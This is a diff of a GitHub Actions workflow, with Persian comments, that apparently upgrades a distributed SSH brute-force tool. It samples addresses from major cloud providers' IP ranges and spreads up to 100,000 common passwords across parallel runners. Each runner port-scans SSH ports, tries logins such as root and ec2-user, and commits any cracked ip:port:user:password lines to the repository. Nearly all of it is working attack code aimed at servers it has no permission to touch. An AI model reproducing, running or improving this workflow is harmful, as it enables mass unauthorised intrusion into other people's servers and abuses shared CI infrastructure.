@@ -1,159 +1,46 @@
-name: Distributed SSH Dominator
+name: Distributed SSH Dominator (Maximum Power)
 
 on:
   workflow_dispatch:
     inputs:
       shard_count:
-        description: 'تعداد رانرهای هم‌زمان (مثلاً ۱۰)'
+        description: 'تعداد رانرهای هم‌زمان (پیش‌فرض ۲۰)'
         required: true
-        default: '10'
+        default: '20'
       max_ips:
-        description: 'حداکثر آیپی برای اسکن (پیش‌فرض ۳۰۰۰۰)'
+        description: 'حداکثر آیپی برای اسکن (پیش‌فرض ۵۰۰۰۰)'
         required: false
-        default: '30000'
+        default: '50000'
       test_threads:
-        description: 'نخ‌های هم‌زمان تست (پیش‌فرض ۵۰۰)'
+        description: 'نخ‌های هم‌زمان تست (پیش‌فرض ۲۰۰۰)'
         required: false
-        default: '500'
+        default: '2000'
       timeout:
-        description: 'زمان انتظار اتصال (ثانیه)'
+        description: 'زمان انتظار اتصال (پیش‌فرض ۱)'
         required: true
-        default: '2'
+        default: '1'
 
 permissions:
   contents: write
 
 jobs:
-  # ===== مرحله ۱: آماده‌سازی و تولید لیست شماره شاردها =====
   prepare:
     runs-on: ubuntu-latest
     outputs:
-      shard_indices: ${{ steps.set_output.outputs.indices }}
+      shard_indices: ${{ steps.build.outputs.indices }}
     steps:
       - uses: actions/checkout@v4
       
-      - name: نصب کتابخونه‌ها
-        run: pip3 install rich requests
-
-      - name: آماده‌سازی task_list.json و خروجی شاردها
-        id: set_output
+      - name: تولید اسکنر + task_list.json
+        id: build
         env:
           SHARD_COUNT: ${{ github.event.inputs.shard_count }}
           MAX_IPS: ${{ github.event.inputs.max_ips }}
         run: |
-          python3 -c "
-          import os, json, random, ipaddress, requests
-
-          SHARD_COUNT = int(os.environ['SHARD_COUNT'])
-          MAX_IPS = int(os.environ['MAX_IPS'])
-
-          print(f'🔄 آماده‌سازی {SHARD_COUNT} شارد...')
-
-          # دریافت آی‌پی‌های دیتاسنتر
-          datacenter_urls = []
-          try:
-              resp = requests.get('https://raw.githubusercontent.com/jhassine/server-ip-addresses/master/data/datacenters.txt', timeout=30)
-              for line in resp.text.splitlines():
-                  line = line.strip()
-                  if line and not line.startswith('#'):
-                      datacenter_urls.append(line)
-          except: pass
-
-          provider_map = {'aws':'aws','azure':'azure','gcp':'googlecloud','digitalocean':'digitalocean','linode':'linode','vultr':'vultr','cloudflare':'cloudflare'}
-          base_url = 'https://raw.githubusercontent.com/rezmoss/cloud-provider-ip-addresses/master/data'
-          for prov in provider_map.values():
-              try:
-                  resp = requests.get(f'{base_url}/{prov}-ip-ranges.json', timeout=30)
-                  data = resp.json()
-                  for item in data.get('prefixes',[]):
-                      if 'ipv4Prefix' in item:
-                          datacenter_urls.append(item['ipv4Prefix'])
-              except: pass
-
-          all_ips = set()
-          random.shuffle(datacenter_urls)
-          for cidr in datacenter_urls[:3000]:
-              try:
-                  network = ipaddress.IPv4Network(cidr, strict=False)
-                  hosts = list(network.hosts())
-                  sample_size = min(20, len(hosts))
-                  for ip in random.sample(hosts, sample_size):
-                      all_ips.add(str(ip))
-              except: pass
-
-          ips = list(all_ips)[:MAX_IPS]
-          print(f'✅ {len(ips)} آیپی جمع‌آوری شد')
-
-          # دریافت پسوردها از SecLists
-          passwords = ['password', '123456', 'admin', 'root']
-          try:
-              resp = requests.get('https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10k-most-common.txt', timeout=60)
-              passwords = list(set([line.strip() for line in resp.text.splitlines() if line.strip()]))
-              print(f'✅ {len(passwords)} پسورد از SecLists')
-          except:
-              print('⚠️ SecLists در دسترس نیست')
-
-          # تقسیم آی‌پی‌ها و پسوردها بین شاردها
-          ip_chunk = len(ips) // SHARD_COUNT
-          pwd_chunk = len(passwords) // SHARD_COUNT
-          tasks = []
-          for i in range(SHARD_COUNT):
-              start_ip = i * ip_chunk
-              end_ip = start_ip + ip_chunk if i != SHARD_COUNT - 1 else len(ips)
-              start_pwd = i * pwd_chunk
-              end_pwd = start_pwd + pwd_chunk if i != SHARD_COUNT - 1 else len(passwords)
-              tasks.append({
-                  'shard': i,
-                  'ips': ips[start_ip:end_ip],
-                  'passwords': passwords[start_pwd:end_pwd]
-              })
-
-          with open('task_list.json', 'w') as f:
-              json.dump(tasks, f, indent=2)
-          print(f'✅ {len(tasks)} شارد در task_list.json ذخیره شد')
-          
-          # خروجی شماره شاردها
-          with open('indices.json', 'w') as f:
-              json.dump(list(range(SHARD_COUNT)), f)
-          "
-          
-          echo "indices=$(cat indices.json)" >> $GITHUB_OUTPUT
-
-      - name: آپلود task_list.json
-        uses: actions/upload-artifact@v4
-        with:
-          name: task-list
-          path: task_list.json
-
-  # ===== مرحله ۲: اسکن موازی =====
-  scan_shard:
-    name: "Shard ${{ matrix.shard }}"
-    needs: prepare
-    runs-on: ubuntu-latest
-    strategy:
-      fail-fast: false
-      matrix:
-        shard: ${{ fromJson(needs.prepare.outputs.shard_indices) }}
-    steps:
-      - uses: actions/checkout@v4
-      
-      - name: دانلود task_list.json
-        uses: actions/download-artifact@v4
-        with:
-          name: task-list
-
-      - name: نصب کتابخونه‌ها
-        run: pip3 install rich asyncssh uvloop aiohttp
-
-      - name: اجرای اسکن شارد
-        env:
-          SHARD_ID: ${{ matrix.shard }}
-          TEST_THREADS: ${{ github.event.inputs.test_threads }}
-          TIMEOUT: ${{ github.event.inputs.timeout }}
-        run: |
-          python3 -c "
+          cat > scanner.py << 'SCANNER_EOF'
           import os, sys, json, asyncio, random, socket, time, concurrent.futures
           from pathlib import Path
+          from datetime import datetime
           import asyncssh
 
           try:
@@ -162,10 +49,11 @@ jobs:
           except: pass
 
           SHARD_ID = int(os.environ['SHARD_ID'])
-          TEST_THREADS = int(os.environ.get('TEST_THREADS', 500))
-          TIMEOUT = int(os.environ.get('TIMEOUT', 2))
-          SSH_PORTS = [22, 2222, 22222, 2200]
-          CRED_FILE = f'found_creds_shard_{SHARD_ID}.txt'
+          TEST_THREADS = int(os.environ.get('TEST_THREADS', 2000))
+          TIMEOUT = int(os.environ.get('TIMEOUT', 1))
+          SSH_PORTS = [22, 2222, 22222, 2200, 222]
+          CRED_FILE = f"found_creds_shard_{SHARD_ID}.txt"
+          REPORT_FILE = f"scan_report_shard_{SHARD_ID}.txt"
 
           with open('task_list.json') as f:
               tasks = json.load(f)
@@ -173,20 +61,21 @@ jobs:
           ips = my_task['ips']
           passwords = my_task['passwords']
 
-          print(f'🔥 شارد {SHARD_ID}: {len(ips)} آیپی | {len(passwords)} پسورد')
+          scan_start = time.time()
+          print(f'🔥 شارد {SHARD_ID}: {len(ips)} آیپی | {len(passwords)} پسورد | {TEST_THREADS} نخ')
 
-          # اسکن پورت
+          # ===== اسکن پورت فوق‌سریع =====
           ssh_targets = []
           def check_ssh(ip, port):
               try:
                   sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                  sock.settimeout(0.3)
+                  sock.settimeout(0.15)
                   result = sock.connect_ex((ip, port))
                   sock.close()
                   return (ip, port) if result == 0 else None
               except: return None
 
-          with concurrent.futures.ThreadPoolExecutor(max_workers=300) as executor:
+          with concurrent.futures.ThreadPoolExecutor(max_workers=2000) as executor:
               futures = []
               for ip in ips:
                   for port in SSH_PORTS:
@@ -196,14 +85,19 @@ jobs:
                   if res:
                       ssh_targets.append(res)
 
-          print(f'✅ {len(ssh_targets)} سرور SSH پیدا شد')
-
+          scan_time = time.time() - scan_start
+          print(f'✅ {len(ssh_targets)} سرور SSH در {scan_time:.1f} ثانیه پیدا شد')
+          
           if not ssh_targets:
+              # نوشتن گزارش خالی
+              with open(REPORT_FILE, 'w') as f:
+                  f.write(f"Shard {SHARD_ID} Report\nNo targets found\n")
+              os.system(f'git add {REPORT_FILE} && git commit -m "Shard {SHARD_ID} empty" && git push 2>/dev/null || true')
               print('بدون هدف، پایان')
               sys.exit(0)
 
-          # تست اعتبارنامه
-          usernames = ['root', 'admin', 'ubuntu', 'ec2-user', 'azureuser', 'centos', 'debian', 'vagrant', 'pi']
+          # ===== تست اعتبارنامه فوق‌سریع =====
+          usernames = ['root', 'admin', 'ubuntu', 'ec2-user', 'azureuser', 'centos', 'debian', 'vagrant', 'pi', 'oracle']
           cache_file = Path('cache') / f'dominator_cache_shard_{SHARD_ID}.json'
           cache_file.parent.mkdir(exist_ok=True)
           cache = json.load(open(cache_file)) if cache_file.exists() else {}
@@ -246,37 +140,168 @@ jobs:
               for r in results:
                   successes.extend(r)
 
+          test_start = time.time()
           asyncio.run(main())
+          test_time = time.time() - test_start
 
-          # ذخیره نتایج
+          # ===== ذخیره نتایج =====
           with open(CRED_FILE, 'w') as f:
               for ip, port, user, pwd, _ in successes:
                   f.write(f'{ip}:{port}:{user}:{pwd}\n')
+          
           with open(cache_file, 'w') as f:
               json.dump(cache, f)
 
-          os.system(f'git add {CRED_FILE} {cache_file} && git commit -m \"Shard {SHARD_ID} results\" && git push 2>/dev/null || true')
-          print(f'📄 شارد {SHARD_ID} تموم شد. {len(successes)} اعتبارنامه پیدا شد')
-          "
+          # گزارش کامل
+          with open(REPORT_FILE, 'w') as f:
+              f.write(f"Shard {SHARD_ID} Report\n")
+              f.write(f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
+              f.write(f"IPs Scanned: {len(ips)}\n")
+              f.write(f"SSH Targets Found: {len(ssh_targets)}\n")
+              f.write(f"Passwords Tested: {len(passwords)}\n")
+              f.write(f"Credentials Found: {len(successes)}\n")
+              f.write(f"Scan Time: {scan_time:.1f}s\n")
+              f.write(f"Test Time: {test_time:.1f}s\n")
+              f.write(f"Total Time: {scan_time+test_time:.1f}s\n")
+              f.write("="*50 + "\n")
+              for ip, port, user, pwd, _ in successes:
+                  f.write(f"{ip}:{port}:{user}:{pwd}\n")
 
-  # ===== مرحله ۳: ادغام نتایج =====
+          os.system(f'git add {CRED_FILE} {REPORT_FILE} {cache_file} && git commit -m "Shard {SHARD_ID} complete" && git push 2>/dev/null || true')
+          
+          total_time = time.time() - scan_start
+          print(f'📄 شارد {SHARD_ID} تمام شد. {len(successes)} پیدا شد. کل زمان: {total_time:.1f}s')
+          SCANNER_EOF
+          
+          # ساختن task_list.json با ۱۰۰ هزار پسورد
+          python3 -c "
+          import os, json, random, ipaddress, requests
+          SHARD_COUNT = int(os.environ['SHARD_COUNT'])
+          MAX_IPS = int(os.environ['MAX_IPS'])
+          
+          print('🌐 دریافت آیپی‌های دیتاسنتر...')
+          datacenter_urls = []
+          try:
+              resp = requests.get('https://raw.githubusercontent.com/jhassine/server-ip-addresses/master/data/datacenters.txt', timeout=30)
+              for line in resp.text.splitlines():
+                  line = line.strip()
+                  if line and not line.startswith('#'):
+                      datacenter_urls.append(line)
+          except: pass
+          provider_map = {'aws':'aws','azure':'azure','gcp':'googlecloud','digitalocean':'digitalocean','linode':'linode','vultr':'vultr','cloudflare':'cloudflare'}
+          base_url = 'https://raw.githubusercontent.com/rezmoss/cloud-provider-ip-addresses/master/data'
+          for prov in provider_map.values():
+              try:
+                  resp = requests.get(f'{base_url}/{prov}-ip-ranges.json', timeout=30)
+                  data = resp.json()
+                  for item in data.get('prefixes',[]):
+                      if 'ipv4Prefix' in item:
+                          datacenter_urls.append(item['ipv4Prefix'])
+              except: pass
+          all_ips = set()
+          random.shuffle(datacenter_urls)
+          for cidr in datacenter_urls[:5000]:
+              try:
+                  network = ipaddress.IPv4Network(cidr, strict=False)
+                  hosts = list(network.hosts())
+                  sample_size = min(30, len(hosts))
+                  for ip in random.sample(hosts, sample_size):
+                      all_ips.add(str(ip))
+              except: pass
+          ips = list(all_ips)[:MAX_IPS]
+          print(f'✅ {len(ips)} آیپی')
+          
+          print('⬇️ دانلود ۱۰۰K پسورد از SecLists...')
+          passwords = ['password','123456','admin','root','12345678','qwerty']
+          try:
+              # 100k passwords list
+              resp = requests.get('https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-100000.txt', timeout=120)
+              passwords = list(set([line.strip() for line in resp.text.splitlines() if line.strip()]))
+              print(f'✅ {len(passwords)} پسورد')
+          except:
+              try:
+                  resp = requests.get('https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10k-most-common.txt', timeout=60)
+                  passwords = list(set([line.strip() for line in resp.text.splitlines() if line.strip()]))
+                  print(f'⚠️ Fallback: {len(passwords)} پسورد')
+              except: pass
+          
+          # تقسیم بین شاردها
+          ip_chunk = len(ips) // SHARD_COUNT
+          pwd_chunk = len(passwords) // SHARD_COUNT
+          tasks = []
+          for i in range(SHARD_COUNT):
+              start_ip = i * ip_chunk
+              end_ip = start_ip + ip_chunk if i != SHARD_COUNT - 1 else len(ips)
+              start_pwd = i * pwd_chunk
+              end_pwd = start_pwd + pwd_chunk if i != SHARD_COUNT - 1 else len(passwords)
+              tasks.append({
+                  'shard': i,
+                  'ips': ips[start_ip:end_ip],
+                  'passwords': passwords[start_pwd:end_pwd]
+              })
+          
+          with open('task_list.json','w') as f: json.dump(tasks, f)
+          with open('indices.json','w') as f: json.dump(list(range(SHARD_COUNT)), f)
+          print(f'✅ {len(tasks)} شارد ساخته شد')
+          "
+          echo "indices=$(cat indices.json)" >> $GITHUB_OUTPUT
+
+      - name: آپلود بسته اسکنر
+        uses: actions/upload-artifact@v4
+        with:
+          name: scanner-package
+          path: |
+            scanner.py
+            task_list.json
+
+  scan_shard:
+    name: "Shard ${{ matrix.shard }}"
+    needs: prepare
+    runs-on: ubuntu-latest
+    strategy:
+      fail-fast: false
+      matrix:
+        shard: ${{ fromJson(needs.prepare.outputs.shard_indices) }}
+    steps:
+      - uses: actions/checkout@v4
+      
+      - name: دانلود بسته اسکنر
+        uses: actions/download-artifact@v4
+        with:
+          name: scanner-package
+
+      - name: نصب وابستگی‌ها
+        run: pip3 install asyncssh uvloop aiohttp
+
+      - name: اجرای اسکنر فوق‌سریع
+        env:
+          SHARD_ID: ${{ matrix.shard }}
+          TEST_THREADS: ${{ github.event.inputs.test_threads }}
+          TIMEOUT: ${{ github.event.inputs.timeout }}
+        run: python3 scanner.py
+
   merge:
     needs: scan_shard
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       
-      - name: ادغام نتایج
+      - name: ادغام نهایی
         run: |
           git pull origin main 2>/dev/null || true
-          echo "📊 ادغام نتایج همه شاردها..."
-          cat found_creds_shard_*.txt > final_creds.txt 2>/dev/null || echo "هنوز نتیجه‌ای ذخیره نشده"
+          
+          echo "📊 جمع‌آوری نتایج..."
+          cat found_creds_shard_*.txt > final_creds.txt 2>/dev/null || echo "بدون نتیجه"
+          cat scan_report_shard_*.txt > full_scan_report.txt 2>/dev/null || echo "بدون گزارش"
+          
           if [ -s final_creds.txt ]; then
-            echo "✅ نتایج نهایی:"
+            total=$(wc -l < final_creds.txt)
+            echo "✅ $total اعتبارنامه پیدا شد:"
             cat final_creds.txt
-            git add final_creds.txt
-            git commit -m "Merge all shard results" || true
-            git push || true
           else
             echo "❌ هیچ اعتبارنامه‌ای پیدا نشد"
           fi
+          
+          git add final_creds.txt full_scan_report.txt
+          git commit -m "Merge all shards - final results" || true
+          git push || true
